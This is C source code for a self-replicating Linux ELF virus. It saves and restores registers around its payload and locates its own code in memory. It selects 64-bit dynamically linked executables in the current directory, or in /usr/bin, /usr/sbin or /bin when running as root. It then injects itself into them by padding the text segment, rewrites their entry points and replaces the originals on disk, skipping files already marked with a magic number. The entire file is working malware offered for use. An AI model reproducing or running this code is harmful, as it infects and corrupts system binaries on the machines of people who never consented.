#include "private.h"

#define TMP "/tmp/.xyz.skeksi.elf64"

#define LUCKY_NUMBER 7
#define MAGIC_NUMBER 0x15D25 //thankz Mr. h0ffman

#define __ASM__ asm __volatile__

extern long real_start;
extern long get_rip_label;

unsigned long get_rip(void);

struct bootstrap_data {
	int argc;
	char **argv;
};

typedef struct elfbin {
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	Elf64_Addr textVaddr;
	Elf64_Addr dataVaddr;
	size_t textSize;
	size_t dataSize;
	uint8_t *mem;
	size_t size;
	char *path;
	struct stat st;
} elfbin_t;

#define DIR_COUNT 3

_start()
{
	struct bootstrap_data bootstrap;
	//_printf("%x\n", bootstrap);
	/*
	 * Save register state before executing parasite
	 * code.
	 */
	__ASM__ (
	 ".globl real_start	\n"
 	 "push %rsp	\n"
	 "push %rbp	\n"
	 "push %rax	\n"
	 "push %rbx	\n"
	 "push %rcx	\n"
	 "push %rdx	\n"
	 "push %r8	\n"
	 "push %r9	\n"
	 "push %r10	\n"
	 "push %r11	\n"
	 "push %r12	\n"
	 "push %r13	\n"
	 "push %r14	\n"
	 "push %r15	  ");
	
	__ASM__ ("mov 0x08(%%rbp), %%rcx " : "=c" (bootstrap.argc));
        __ASM__ ("lea 0x10(%%rbp), %%rcx " : "=c" (bootstrap.argv));

	/*
	 * Load bootstrap pointer as argument to do_main()
	 * and call it.
	 */
	__ASM__ ( 
	 "leaq %0, %%rdi\n"
	 "call do_main   " :: "g"(bootstrap)
	);

	/*
	 * Restore register state
	 */
	asm __volatile__(
	 "pop %r15	\n"
	 "pop %r14	\n"
	 "pop %r13	\n"
	 "pop %r12	\n"
	 "pop %r11	\n"
	 "pop %r10	\n"
	 "pop %r9	\n"
	 "pop %r8	\n"
	 "pop %rdx	\n"
	 "pop %rcx	\n"
	 "pop %rbx	\n"
	 "pop %rax	\n"
	 "pop %rbp	\n"
	 "pop %rsp	\n"	
	 "jmp end_code	" 
	);
}

/*
 * Heap areas are created by passing a NULL initialized
 * pointer by reference.  Each heap area maxes out at 4k
 * and it is up to the caller of vx_malloc() to keep track
 * of how much space has been used. For our uses this is
 * perfect.
 */
void * vx_malloc(size_t len, uint8_t **mem)
{
	if (*mem == NULL) {
		*mem = _mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
		if (*mem == MAP_FAILED) {
			DEBUG_PRINT("malloc failed with mmap\n");
			Exit(-1);
		}
	}
	*mem += len;
	**mem = 0;
	return (void *)((char *)*mem - len);
}

void vx_free(uint8_t *mem)
{
	uintptr_t addr = (uintptr_t)mem;
	addr &= ~4095;
	mem = (uint8_t *)addr;
	_munmap(mem, 4096);
}
/*
 * We rely on ASLR to get our psuedo randomness, since RSP will be different
 * at each execution.
 */
int _rand(long *seed) // RAND_MAX assumed to be 32767
{
        *seed = *seed * 1103515245 + 12345;
        return (unsigned int)(*seed / 65536) & 32767;
}

uint32_t get_random_number(int max)
{
	long rsp;
        asm __volatile__("mov %%rsp, %0" : "=r"(rsp));
	return _rand(&rsp) % max;
}
	
char * randomly_select_dir(char **dirs) 
{	
	return (char *)dirs[get_random_number(DIR_COUNT)];
}

char * full_path(char *exe, char *dir)
{
	static uint8_t *heap = NULL;
	char *ptr = (char *)vx_malloc(_strlen(exe) + _strlen(dir) + 2, &heap);
	Memset(ptr, 0, _strlen(exe) + _strlen(dir));
	_memcpy(ptr, dir, _strlen(dir));
	ptr[_strlen(dir)] = '/';
	if (*exe == '.' && *(exe + 1) == '/')
		exe += 2;
	_memcpy(&ptr[_strlen(dir) + 1], exe, _strlen(exe));
	return ptr;
}
	
#define JMPCODE_LEN 6

int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t *self, ElfW(Addr) entry_point)
{
	int ofd;
	unsigned int c;
	int i, t = 0, ehdr_size = sizeof(ElfW(Ehdr));
	unsigned char *mem = target->mem;
	unsigned char *parasite = self->mem + ehdr_size;
	char *host = target->path, *protected; 
	struct stat st;

	_memcpy((struct stat *)&st, (struct stat *)&target->st, sizeof(struct stat));

        /* eot is: 
         * end_of_text = e_hdr->e_phoff + nc * e_hdr->e_phentsize;
         * end_of_text += p_hdr->p_filesz;
         */ 
        extern int return_entry_start;

        if ((ofd = _open(TMP, O_CREAT | O_WRONLY | O_TRUNC/*, st.st_mode*/)) == -1) 
                return -1;
        
        /*
         * Write first 64 bytes of original binary (The elf file header) 
         * [ehdr] 
         */
	DEBUG_PRINT("Writing ehdr\n");
        if ((c = _write(ofd, mem, ehdr_size)) != ehdr_size) 
		return -1;
        
        /*
         * Now inject the virus
         * [ehdr][virus]
         */
	DEBUG_PRINT("Writing parasite\n");
        if ((c = _write(ofd, parasite, self->size - ehdr_size)) != self->size - ehdr_size) {
		DEBUG_PRINT("Wrote %d bytes (not %d)\n", c, self->size - ehdr_size);
		return -1;
	}

  	/*
         * Seek to end of tracer.o + PAGE boundary  
         * [ehdr][virus][pad]
         */
	DEBUG_PRINT("Writing phdr's, text, data\n");
        uint32_t offset = sizeof(ElfW(Ehdr)) + paddingSize;
        if ((c = _lseek(ofd, offset, SEEK_SET)) != offset) 
		return -1;
        
        /*
         * Write the rest of the original binary
         * [ehdr][virus][pad][phdrs][text][data][shdrs]
         */
        mem += sizeof(Elf64_Ehdr);
        
        unsigned int final_length = st.st_size - (sizeof(ElfW(Ehdr))); // + target->ehdr->e_shnum * sizeof(Elf64_Shdr));
        if ((c = _write(ofd, mem, final_length)) != final_length) 
		return -1;
        
		
        _rename(TMP, target->path);
        
	_close(ofd);


}

int infect_elf_file(elfbin_t *self, elfbin_t *target)
{
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	uint8_t *mem;
	int fd;
	int text_found = 0, i;
        Elf64_Addr orig_entry_point;
        Elf64_Addr origText;
	size_t parasiteSize;
	size_t paddingSize;
	struct stat st;
	
	/*
	 * Get size of parasite (self)
	 */
        parasiteSize = self->size;
	_printf("parasiteSize: %d\n", parasiteSize);
	paddingSize = PAGE_ALIGN_UP(parasiteSize + JMPCODE_LEN);
	_printf("paddingSize: %d\n", paddingSize);
	
	
	mem = target->mem;
	ehdr = (Elf64_Ehdr *)target->ehdr;
	phdr = (Elf64_Phdr *)target->phdr;
	shdr = (Elf64_Shdr *)target->shdr;
	orig_entry_point = ehdr->e_entry;
	
	phdr[0].p_offset += paddingSize;
        phdr[1].p_offset += paddingSize;
        
        for (i = 0; i < ehdr->e_phnum; i++) {
                if (text_found)
                        phdr[i].p_offset += paddingSize;
        
                if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R|PF_X)) {
                                origText = phdr[i].p_vaddr;
                                phdr[i].p_vaddr -= paddingSize;
                                phdr[i].p_paddr -= paddingSize;
                                phdr[i].p_filesz += paddingSize;
                                phdr[i].p_memsz += paddingSize;
                                text_found = 1;
                }
        }
        if (!text_found) {
                DEBUG_PRINT("Error, unable to locate text segment in target executable: %s\n", target->path);
                return -1;
        }
	_printf("origText: %x\n", origText);
	ehdr->e_entry = origText - paddingSize + sizeof(ElfW(Ehdr));
	_printf("new e_entry %x\n", ehdr->e_entry);
	shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];

	for (i = 0; i < ehdr->e_shnum; i++) 
		shdr[i].sh_offset += paddingSize;
	
	ehdr->e_shoff += paddingSize;
	ehdr->e_phoff += paddingSize;

	inject_parasite(parasiteSize, paddingSize, target, self, orig_entry_point);

}
/*
 * Since our parasite exists of both a text and data segment
 * we include the initial ELF file header and phdr in each parasite
 * insertion. This lends itself well to being able to self-load by
 * parsing our own program headers etc.
 */
int load_self(elfbin_t *elf)
{	
	int i;
	void (*f1)(void) = (void *)end_code; //(void (*)())end_code;
	void (*f2)(void) = (void (*)())dummy_marker;
	Elf64_Addr _start_addr = get_rip() - ((char *)&get_rip_label - (char *)&_start);
	elf->mem = (uint8_t *)_start_addr;
	elf->size = (char *)&end_code - (char *)&real_start; 
	elf->size += (int)((char *)f2 - (char *)f1);
	DEBUG_PRINT("end_code is %d bytes\n", (char *)f2 - (char *)f1);
	return 0;
}

int load_target(const char *path, elfbin_t *elf)
{
	int i;
	struct stat st;
	int fd = _open(path, O_RDONLY);
	if (fd < 0)
		return -1;
	if (_fstat(fd, &st) < 0)
		return -1;
	elf->mem = _mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (elf->mem == MAP_FAILED)
		return -1;
	elf->ehdr = (Elf64_Ehdr *)elf->mem;
	elf->phdr = (Elf64_Phdr *)&elf->mem[elf->ehdr->e_phoff];
	elf->shdr = (Elf64_Shdr *)&elf->mem[elf->ehdr->e_shoff];
	for (i = 0; i < elf->ehdr->e_phnum; i++) {
		if (elf->phdr[i].p_type == PT_LOAD)
                	switch(!!elf->phdr[i].p_offset) {
                        	case 0:
                                	elf->textVaddr = elf->phdr[i].p_vaddr;
                                	elf->textSize = elf->phdr[i].p_memsz;
                                	break;
                               	case 1:
                                	elf->dataVaddr = elf->phdr[i].p_vaddr;
                                	elf->dataSize = elf->phdr[i].p_memsz;
                                	break;
                        }
        }
	elf->st = st;
	elf->size = st.st_size;
	return 0;
}

/*
 * Must be ELF
 * Must be ET_EXEC
 * Must be dynamically linked
 * Must not yet be infected
 */
int check_criteria(char *filename)
{
	int fd, dynamic, i, ret = 0;
	struct stat st;
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	uint8_t mem[4096];
	uint32_t magic;
	
	fd = _open(filename, O_RDONLY);
	if (fd < 0) 
		return -1;
	if (_read(fd, mem, 4096) < 0)
		return -1;
	_close(fd);
	ehdr = (Elf64_Ehdr *)mem;
	phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
	if(_memcmp("\x7f\x45\x4c\x46", mem, 4) != 0)
		return -1;
	magic = *(uint32_t *)((char *)&ehdr->e_ident[EI_PAD]);
	if (magic == MAGIC_NUMBER) //already infected? Then skip this file
		return -1;
	if (ehdr->e_machine != EM_X86_64)
		return -1;
	for (dynamic = 0, i = 0; i < ehdr->e_phnum; i++) 
		if (phdr[i].p_type == PT_DYNAMIC)	
			dynamic++;
	if (!dynamic) 
		return -1;

}
void do_main(struct bootstrap_data *bootstrap)
{
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	uint8_t *mem;
	
	struct linux_dirent64 *d;
	int bpos, fcount, dd, nread;
	char *dir = NULL, **files, dbuf[1024];
	struct stat st;
	mode_t mode;
	uint32_t rnum;
	elfbin_t self, target;
	
	/*
	 * NOTE: 
	 * we can't use string literals because they will be
	 * stored in either .rodata or .data sections.
	 */
	char dirs[3][32] = {
			{'/','u','s','r','/','b','i','n','\0'},
			{'/','u','s','r','/','s','b','i','n','\0'},        
			{'/','b','i','n','\0'}
			};

	_printf("bootstrap: %x\n", bootstrap);
	dir = _getuid() != 0 ? "." : randomly_select_dir((char **)dirs);
	
	DEBUG_PRINT("Infecting files in directory: %s\n", dir);
	
	dd = _open(dir, O_RDONLY | O_DIRECTORY);
	if (dd < 0) {
		DEBUG_PRINT("open failed\n");
		return;
	}
	
	load_self(&self);
	
	for (;;) {
		nread = _getdents64(dd, (struct linux_dirent64 *)dbuf, 4096);
		if (nread < 0) {
			DEBUG_PRINT("getdents64 failed\n");
			return;
		}
		if (nread == 0)
			break;
		for (fcount = 0, bpos = 0; bpos < nread; bpos++) {
			d = (struct linux_dirent64 *) (dbuf + bpos);
    			bpos += d->d_reclen - 1;
			_printf("argv[0]: %s\n", bootstrap->argv[0]);
			if (!_strcmp(d->d_name, &bootstrap->argv[0][2])) {
				continue;
			}
			rnum = get_random_number(10);
			//if (rnum != LUCKY_NUMBER)
			//	continue;
			if (d->d_name[0] == '.')
				continue;
			if (check_criteria(full_path(d->d_name, dir)) < 0)
				continue;
			DEBUG_PRINT("infecting file: %s\n", d->d_name);
			
			load_target(d->d_name, &target);
			infect_elf_file(&self, &target);
		}
		
	}
}

unsigned long get_rip(void)
{
	long ret;
	__asm__ __volatile__ 
	(
	"call get_rip_label	\n"
       	".globl get_rip_label	\n"
       	"get_rip_label:		\n"
        "pop %%rax		\n"
	"mov %%rax, %0" : "=r"(ret)
	);

	return ret;
}


void end_code() 
{
	Exit(0);

}

void dummy_marker()
{
	__ASM__("nop");
}

